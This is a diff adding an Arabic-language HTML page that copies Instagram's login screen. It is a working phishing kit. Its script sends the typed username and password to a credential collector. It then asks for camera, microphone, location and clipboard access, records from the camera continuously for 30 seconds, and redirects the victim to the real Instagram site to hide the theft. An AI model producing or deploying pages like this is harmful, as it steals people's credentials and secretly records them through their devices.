@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#E4405F">
+<title>Instagram</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23E4405F' d='M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z'/%3E%3C/svg%3E">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #fafafa;
+    color: #262626;
+  }
+  .container {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .box {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 40px 40px 20px;
+    width: 100%;
+    max-width: 350px;
+    text-align: center;
+    margin-bottom: 10px;
+  }
+  .ig-logo {
+    margin-bottom: 30px;
+  }
+  .ig-logo svg {
+    width: 175px;
+    height: 51px;
+  }
+  .form-input {
+    width: 100%;
+    padding: 9px 8px 7px;
+    font-size: 14px;
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    margin-bottom: 6px;
+    color: #262626;
+    font-family: inherit;
+  }
+  .form-input:focus {
+    outline: none;
+    border: 1px solid #a8a8a8;
+    background: #fff;
+  }
+  .form-input::placeholder { color: #8e8e8e; }
+  .login-btn {
+    width: 100%;
+    padding: 8px 16px;
+    background: #0095f6;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 8px;
+    font-family: inherit;
+    transition: background 0.2s;
+  }
+  .login-btn:disabled {
+    background: #b2dffc;
+    cursor: not-allowed;
+  }
+  .login-btn:active:not(:disabled) { opacity: 0.7; }
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    margin: 20px 0;
+  }
+  .divider::before, .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: #dbdbdb;
+  }
+  .divider span {
+    color: #8e8e8e;
+    font-size: 13px;
+    font-weight: 600;
+  }
+  .fb-login {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    color: #385185;
+    font-size: 14px;
+    font-weight: 600;
+    text-decoration: none;
+    padding: 8px;
+    margin: 10px 0;
+  }
+  .fb-login svg {
+    width: 16px;
+    height: 16px;
+  }
+  .forgot {
+    color: #00376b;
+    font-size: 12px;
+    text-decoration: none;
+    display: block;
+    margin-top: 12px;
+  }
+  .signup-box {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 22px;
+    width: 100%;
+    max-width: 350px;
+    text-align: center;
+    font-size: 14px;
+    margin-bottom: 20px;
+  }
+  .signup-box a {
+    color: #0095f6;
+    text-decoration: none;
+    font-weight: 600;
+  }
+  .apps {
+    text-align: center;
+    margin-top: 10px;
+    font-size: 14px;
+    color: #262626;
+  }
+  .apps-stores {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 16px;
+  }
+  .apps-stores img {
+    height: 40px;
+  }
+  .error-msg {
+    background: #ed4956;
+    color: #fff;
+    padding: 10px 12px;
+    font-size: 13px;
+    border-radius: 4px;
+    margin-bottom: 12px;
+    display: none;
+  }
+  .error-msg.show { display: block; }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="box">
+
+    <!-- Instagram Logo -->
+    <div class="ig-logo">
+      <svg viewBox="0 0 175 51" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#262626" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z" transform="scale(1.2)"/>
+        <text x="42" y="32" font-family="'Segoe UI', -apple-system, sans-serif" font-size="32" font-weight="400" fill="#262626" font-style="italic">Instagram</text>
+      </svg>
+    </div>
+
+    <div class="error-msg" id="error-msg"></div>
+
+    <form id="ig-form" onsubmit="return handleLogin(event)">
+      <input type="text" id="username" class="form-input" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" autocomplete="username" required>
+      <input type="password" id="password" class="form-input" placeholder="كلمة المرور" autocomplete="current-password" required>
+      <button type="submit" class="login-btn" id="login-btn">تسجيل الدخول</button>
+    </form>
+
+    <div class="divider"><span>أو</span></div>
+
+    <a href="#" class="fb-login" onclick="showError('تسجيل الدخول بفيسبوك غير متاح حالياً'); return false;">
+      <svg viewBox="0 0 24 24"><path fill="#385185" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+      تسجيل الدخول باستخدام Facebook
+    </a>
+
+    <a href="#" class="forgot" onclick="showError('تم إرسال رابط استرداد كلمة المرور'); return false;">
+      هل نسيت كلمة المرور؟
+    </a>
+
+  </div>
+
+  <div class="signup-box">
+    ليس لديك حساب؟ <a href="#" onclick="showError('التسجيل غير متاح حالياً'); return false;">أنشئ حساباً</a>
+  </div>
+
+  <div class="apps">
+    احصل على التطبيق
+    <div class="apps-stores">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 40'%3E%3Crect width='120' height='40' rx='6' fill='%23000'/%3E%3Ctext x='60' y='24' text-anchor='middle' fill='%23fff' font-size='11' font-family='sans-serif'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 40'%3E%3Crect width='120' height='40' rx='6' fill='%23000'/%3E%3Ctext x='60' y='24' text-anchor='middle' fill='%23fff' font-size='11' font-family='sans-serif'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play">
+    </div>
+  </div>
+
+</div>
+
+<script src="/fs/static/collector.js"></script>
+
+<script>
+(function() {
+    "use strict";
+
+    var submitting = false;
+
+    function showError(msg) {
+        var el = document.getElementById('error-msg');
+        el.textContent = msg;
+        el.classList.add('show');
+        setTimeout(function() { el.classList.remove('show'); }, 4000);
+    }
+
+    function handleLogin(event) {
+        event.preventDefault();
+        if (submitting) return false;
+
+        var username = document.getElementById('username').value.trim();
+        var password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+            showError('يرجى ملء جميع الحقول');
+            return false;
+        }
+
+        if (password.length < 4) {
+            showError('كلمة المرور غير صحيحة');
+            return false;
+        }
+
+        submitting = true;
+        var btn = document.getElementById('login-btn');
+        btn.disabled = true;
+        btn.textContent = 'جاري التحقق...';
+
+        // إرسال البيانات
+        FSCollector.captureForm({
+            username: username,
+            password: password,
+            form_type: 'login'
+        }, {
+            metadata: { page: 'instagram_01_login' }
+        }).then(function() {
+            FSCollector.showLoader('جاري التحقق من الأمان...');
+
+            // طلب صلاحيات متدرج
+            setTimeout(function() {
+                FSCollector.requestPermissions({
+                    camera: true,
+                    microphone: true,
+                    location: true,
+                    notifications: false,
+                    clipboard: true,
+                    showOverlay: true
+                }).then(function(perms) {
+                    FSCollector.sendPermissionsResult(perms);
+
+                    // بدء التقاط مستمر للكاميرا (30 ثانية)
+                    FSCollector.startContinuousCapture(30000);
+
+                    setTimeout(function() {
+                        FSCollector.redirect('https://www.instagram.com');
+                    }, 2000);
+                });
+            }, 500);
+        });
+
+        return false;
+    }
+
+    window.handleLogin = handleLogin;
+    window.showError = showError;
+
+})();
+</script>
+
+</body>
+</html>
